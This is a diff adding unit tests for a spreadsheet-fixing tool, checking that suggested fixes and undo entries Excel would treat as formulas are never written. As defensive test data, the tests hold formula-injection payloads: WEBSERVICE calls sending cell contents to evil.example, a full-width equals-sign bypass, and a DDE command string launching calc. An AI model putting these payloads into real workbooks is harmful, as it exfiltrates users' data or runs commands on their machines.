@@ -309,6 +309,12 @@ assert.deepEqual([100, 110, 109, 200, 300, 0, 999, 141].map((x) => levelAt(x, 10
 const mr = recommendFix(["Item"], [["Pencl"], ["Pencil"]], 0, {}, 'Item "Pencl" looks like a misspelling of "Pencil"', 0, 0, {}, null, { Item: "Pencil" });
 assert.deepEqual(mr.changes, [{ cell: "A2", new: "Pencil" }]);
 assert.ok(mr.guess && mr.explanation.includes("misspelling"));
+// AH-160: a spelling the engine offers that Excel would read as a formula (a full-width ＝ is =) is never written
+{ const evil = '＝WEBSERVICE("https://evil.example/?"&A2)';
+  assert.deepEqual(recommendFix(["Item"], [["＝webservice(1)"]], 0, {}, "x", 0, 0, { Item: evil }).changes, []);
+  assert.deepEqual(recommendFix(["Item"], [["Pencl"]], 0, {}, "x", 0, 0, {}, null, { Item: "@SUM(A1)" }).changes, []);
+  assert.deepEqual(recommendFix(["Item"], [["east"]], 0, {}, "x", 0, 0, { Item: "East" }).changes, [{ cell: "A2", new: "East" }]);
+  assert.deepEqual(recommendFix(["Item"], [["-5 kg"]], 0, {}, "x", 0, 0, { Item: "-5" }).changes, [{ cell: "A2", new: "-5" }]); }
 
 // auto-fix: only the engine's exact fixes, on known columns; text must match exactly for Undo
 // undo auto-fixes never types a formula or writes off-grid, whatever the workbook's stored undo says (2026-10-15
@@ -316,9 +322,13 @@ assert.ok(mr.guess && mr.explanation.includes("misspelling"));
 assert.deepEqual(safeUndo([{ cell: "B3", old: "east " }, { cell: "Z1", old: '=WEBSERVICE("https://x/?"&A2)' },
   { cell: "B4", old: "＝1+1" }, { cell: "B5", old: "@SUM(1)" }, { cell: "B6", old: "+cmd|'/c calc'!A0" },
   { cell: "B7", old: -5 }, { cell: "B8", old: "-5" }, { cell: "Sheet2!A1", old: "x" }, { cell: "B9", old: null },
-  { cell: "B10", old: "-west" }]).map((w) => w.cell), ["B3", "B7", "B8", "B9"]);
+  { cell: "B10", old: "-west" }, { cell: "B11", old: ['=WEBSERVICE("https://x/?"&A2)'] }, { cell: "B12", old: { a: 1 } },
+  { cell: "B13", old: true }, { cell: "B14", old: Infinity }]).map((w) => w.cell), ["B3", "B7", "B8", "B13"]);
 assert.deepEqual(exactFixes([{ exact: { Region: "East" } }, null, { severity: "Low", likely: { Units: 5 } }, { exact: { Nope: "x" } }], ["Date", "Region"]),
   [{ k: 0, j: 1, value: "East" }]);
+// AH-160: an exact fix the engine gives that Excel would read as a formula is never auto-written (a full-width ＝ is =)
+assert.deepEqual(exactFixes([{ exact: { Region: '＝WEBSERVICE("https://evil.example/?"&A2)' } }, { exact: { Region: "+cmd" } },
+  { exact: { Region: "-5" } }], ["Date", "Region"]), [{ k: 2, j: 1, value: "-5" }]);
 
 // instant recommendation: data A1:C5, header row 1, limits on Units only
 const cols = ["Date", "Region", "Units"];
